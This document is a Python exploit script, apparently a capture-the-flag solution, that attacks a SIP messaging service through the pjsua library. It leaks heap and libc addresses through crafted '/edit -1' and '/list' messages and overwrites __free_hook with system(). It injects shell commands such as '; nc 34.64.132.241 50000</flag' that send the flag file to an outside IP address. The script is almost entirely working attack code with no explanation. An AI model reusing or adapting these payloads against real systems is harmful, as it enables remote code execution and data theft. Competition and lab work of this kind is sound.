from pwn import u64, p64
import pjsua
import sys
import threading
import collections
import time


message_queue = collections.deque()
message_event = threading.Semaphore(0)

class MyAccountCallback(pjsua.AccountCallback):

    def on_pager(self, from_uri, contact, mime_type, body):
        message_queue.append(body)
        message_event.release()


domain, username, password = sys.argv[1:]

lib = pjsua.Lib()
if True:
    lib.init()
else:
    lib.init(log_cfg = pjsua.LogConfig(level=9, callback=lambda level, str, len: print(level, str.decode('utf-8'), end='')))
transport = lib.create_transport(pjsua.TransportType.TCP)
lib.start()

acc_config = pjsua.AccountConfig(domain, username, password)
acc_config.id = '<sip:junoim2@iinevoip>'
acc = lib.create_account(acc_config, cb=MyAccountCallback())
acc.set_transport(transport)

acc.set_basic_status(True)
acc.set_registration(True)

# 34.146.89.14
def execute(body):
    assert not message_event.acquire(False)
    acc.send_pager('sip:mailbox@iinevoip', body, hdr_list=[('Length', str(len(body)))])
    message_event.acquire()
    return message_queue.popleft()

# reset
if False:
    execute(b'/edit -1 AAAAAA')
    execute(b'/list')
    exit(0)

if True:
    execute(b'/send junoim2 ' + b'hello1234' + b'; nc 34.64.132.241 50000</flag ;'.rjust(200, b'b'))
    execute(b'/send junoim2 next')

execute(b'/edit -1 \xe0\x2f') # X2\x00L\xd3\x7f
x = execute(b'/list').encode('utf-8', 'surrogateescape')
low = x.split(b'0: ')[1].split(b'\n1: next')[0]
print(x)

execute(b'/edit -1 \xe3\x2f') # X2\x00L\xd3\x7f
x = execute(b'/list').encode('utf-8', 'surrogateescape')
high = x.split(b'0: ')[1].split(b'\n1: next')[0]
print(x)

mmap_heap = u64(low + b'\x00' + high + b'\x00\x00')
print(hex(mmap_heap)) # next

execute(b'/edit -1 ' + p64(mmap_heap)[:2]) # X2\x00L\xd3\x7f
x = execute(b'/list').encode('utf-8', 'surrogateescape')
print(x)

print("YEAH!")

execute(b'/edit -1 ' + b'\xe8\x2e') # X2\x00L\xd3\x7f
x = execute(b'/list').encode('utf-8', 'surrogateescape')
print(x)
heap = u64(x.split(b'0: ')[1].split(b'\n1: next')[0] + b'\x00\x00')
heap_base = heap-0x2df48
print(hex(heap))
print(heap_base, hex(heap_base))

execute(b'/edit -1 ' + p64(heap_base + 0x2a8)[:6]) # X2\x00L\xd3\x7f
x = execute(b'/list').encode('utf-8', 'surrogateescape')
print(x)
y = u64(x.split(b'0: ')[1].split(b'\n1: next')[0] + b'\x00\x00')
libc = y-0x19d360
print(hex(libc))

system = libc+0x45e90
free_hook = libc+0x1d1190
strlen_got = libc+0x00000000001CE0A8

print('free_hook', hex(free_hook))
print('strlen_got', hex(strlen_got))

execute(b'/edit -1 ' + p64(free_hook)[:6])
# execute(b'/edit -1 ' + p64(strlen_got)[:6])
input("GO?")
execute(b'/edit 0 ' + p64(system)[:6])

execute(b'/send 1 hehe; nc 34.64.132.241 50000</flag; hehe')

if True:
    execute(b'/edit -1 AAAAAA')
    execute(b'/list')

'''
for i in range(8, 256, 8):
	execute(b'/edit -1 ' + chr(i).encode('latin-1'))
	x = execute(b'/list')
	print(x)
'''

while True:
    command = input('> ')
    print(execute(command.rstrip().encode('utf-8')))